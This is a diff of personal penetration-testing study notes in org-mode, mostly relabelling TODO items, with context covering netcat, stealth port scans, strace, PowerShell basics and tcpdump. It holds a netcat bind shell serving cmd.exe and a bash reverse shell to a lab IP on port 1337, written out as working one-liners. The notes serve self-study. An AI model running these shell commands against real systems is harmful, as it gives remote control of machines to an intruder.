@@ -398,10 +398,10 @@ axel -a -n 20 -o o.pdf https://example.com/o.pdf
     + //the nmap maintained version, ~ncat -h ==> [Ncat 7.91 (...nmap.org/ncat)]~: ipv6 support, ssl, etc.
     + ~nc -e cmd.exe --allow [ip] -vnlp 1337 --ssl~ //ssl
     + ~nc -vn [ip] 1337 --ssl~ //the nmap ver. ncat ssl connection
-    TODO TCP handshaking and attack vector.(SYN -> SYN/ACK -> ACK)
+    OPTIONAL TCP handshaking and attack vector.(SYN -> SYN/ACK -> ACK)
 
-**** TODO stealth scan (gsec stealth port scanning methods 1985)
-    TODO how nc stealth scan work. (wireshark) (it is definitely not stealth: it break nc listening process.)
+**** stealth scan (gsec stealth port scanning methods 1985)
+    OPTIONAL how nc stealth scan work. (wireshark) (it is definitely not stealth: it break nc listening process.)
     + Inverse Mapping
     + Half Open Scan //scanner SYN, target SYN/ACK, scanner RST
     + FIN Scan //FIN on, closed port send RST, open port ignore the packet
@@ -443,7 +443,7 @@ axel -a -n 20 -o o.pdf https://example.com/o.pdf
     + ~echo -n 'cat' | base64 -w 0~ //echo without trailing \n, base64 encoding without auto wrapping
     + ~echo -n 'Y2F0' | base64 -d~ //decode, -i ignore garbage for more tolerance
 
-*** TODO system call tracing, libcall tracing // man syscall
+*** system call tracing, libcall tracing // man syscall
     + ~strace~
       - ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~ // -f: trace child processes created, as a result of the fork(2), vfork(2), and clone(2) system calls (quote: man strace). grep -n 192.168.140.1 strace.out, check syscalls around the line
     + ~ltrace -f ls~ // -f: same with strace -f.
@@ -726,7 +726,7 @@ axel -a -n 20 -o o.pdf https://example.com/o.pdf
    + ~sfc /SCANNOW~ //Windows Resource Checker
 
 
-** TODO powershell scripting
+** powershell scripting
    + ~(Get-Host).version~
    + ~Get-Help(help)~
    + ~Set-ExecutionPolicy Unrestricted~
@@ -735,7 +735,7 @@ axel -a -n 20 -o o.pdf https://example.com/o.pdf
    + ~echo ([System.Text.Encoding]::Default)~ //get system default text encoding
    + //the *square brackets*. No reference. But seems [.Net TypeName]::staticMethod is legal in powershell.
 
-*** TODO breakpoint?
+*** OMIT breakpoint
 
 *** Base64 encoding in powershell
    + base 64 encoding
@@ -795,7 +795,7 @@ axel -a -n 20 -o o.pdf https://example.com/o.pdf
      + ~foreach ($a in 1..$max) {Write-Host $a}~
      + ~'a'..'f'~
 
-**** $_ //delay bind operator, or "this" in foreach TODO
+**** $_ //delay bind operator, or "this" in foreach
      + ~10..1~
      + ~5..-5 | ForEach-Object {Write-Output $_}~
 
@@ -863,7 +863,7 @@ axel -a -n 20 -o o.pdf https://example.com/o.pdf
       - ip.dst==192.168.140.128 and tcp.port==1337
       - tcp
 
-*** tcpdump TODO advanced if necessary
+*** tcpdump OPTIONAL advanced if necessary
     + ~sudo tcpdump -r dump.pcapng | awk -F " " '{print $3}' | sort | uniq -c | head~ //find the top most frequent active address.
     + ~sudo tcpdump -n src host 192.168.140.1 and port 137 -r dump.pcapng~//n for no hostName converting.
     + ~sudo tcpdump -nX dst host 192.168.140.128 -r dump.pcapng~ //X for hex dump.
